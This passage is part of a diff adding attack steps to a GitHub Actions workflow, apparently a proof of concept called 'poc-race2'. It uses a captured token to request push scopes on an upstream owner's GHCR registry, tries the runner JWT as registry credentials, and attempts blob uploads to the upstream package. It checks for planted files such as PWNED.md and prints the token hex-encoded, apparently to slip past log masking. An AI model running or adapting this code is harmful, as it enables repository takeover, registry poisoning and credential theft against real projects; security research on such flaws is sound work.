+              "https://ghcr.io/token?scope=$SCOPE&service=ghcr.io" 2>/dev/null \
+              | jq -r '.token // empty')
+            if [ -n "$GHCR" ]; then
+              echo "A $SCOPE = ${#GHCR} chars"
+              echo "$GHCR" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq -c '.access // .' 2>/dev/null
+            else
+              echo "A $SCOPE = FAILED"
+            fi
+          done
+          echo ""
+
+          # B: Use runner JWT as GHCR auth
+          echo "--- B: Runner JWT on GHCR ---"
+          if [ -n "$RJWT" ]; then
+            for EP in \
+              "v2/${UPSTREAM_OWNER}/poc-race2/tags/list" \
+              "v2/_catalog" \
+              "v2/${FORK_OWNER}/poc-race2/tags/list"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
+                -H "Authorization: Bearer $RJWT" \
+                "https://ghcr.io/$EP" 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              echo "B $EP = $CODE | $(echo "$BODY" | head -c 120)"
+            done
+          fi
+          echo ""
+
+          # C: Direct blob upload to upstream (skip cross-mount)
+          echo "--- C: Direct blob upload ---"
+          GHCR=$(/usr/bin/curl -sS -u "lacaag:$RT" \
+            "https://ghcr.io/token?scope=repository:${UPSTREAM_OWNER}/poc-race2:push,pull&service=ghcr.io" \
+            | jq -r '.token // empty')
+          if [ -n "$GHCR" ]; then
+            # Try monolithic upload
+            echo "v18-payload" > /tmp/blob_data
+            DIGEST=$(sha256sum /tmp/blob_data | cut -d' ' -f1)
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Authorization: Bearer $GHCR" \
+              "https://ghcr.io/v2/${UPSTREAM_OWNER}/poc-race2/blobs/uploads/?digest=sha256:$DIGEST" \
+              --data-binary @/tmp/blob_data 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            echo "C monolithic upload = $CODE | $(echo "$R" | sed '$d' | head -c 150)"
+
+            # Initiate chunked upload
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -D- -X POST \
+              -H "Authorization: Bearer $GHCR" \
+              "https://ghcr.io/v2/${UPSTREAM_OWNER}/poc-race2/blobs/uploads/" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            LOCATION=$(echo "$R" | grep -i "^location:" | tr -d '\r' | head -1)
+            echo "C initiate upload = $CODE loc=$LOCATION"
+          fi
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 10: Final verification
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 10 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V18 FINAL ==="
+          RT=$(cat /tmp/rt.txt)
+          GH="https://api.github.com"
+
+          echo "--- State ---"
+          /usr/bin/curl -sS -H "Authorization: token $RT" "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO" \
+            | jq '{description,default_branch,visibility}' 2>/dev/null
+          echo "--- Files ---"
+          for F in PWNED.md V18.md V17.md README.md; do
+            R=$(/usr/bin/curl -sS -o /dev/null -w "HTTP_%{http_code}" \
+              -H "Authorization: token $RT" "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/contents/$F")
+            echo "$F=$R"
+          done
+          echo "--- GHCR ---"
+          GHCR=$(/usr/bin/curl -sS -u "lacaag:$RT" \
+            "https://ghcr.io/token?scope=repository:${UPSTREAM_OWNER}/poc-race2:pull&service=ghcr.io" \
+            | jq -r '.token // empty')
+          /usr/bin/curl -sS -H "Authorization: Bearer $GHCR" \
+            "https://ghcr.io/v2/${UPSTREAM_OWNER}/poc-race2/tags/list" 2>/dev/null
+          echo ""
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+          echo "=== V18 COMPLETE ==="
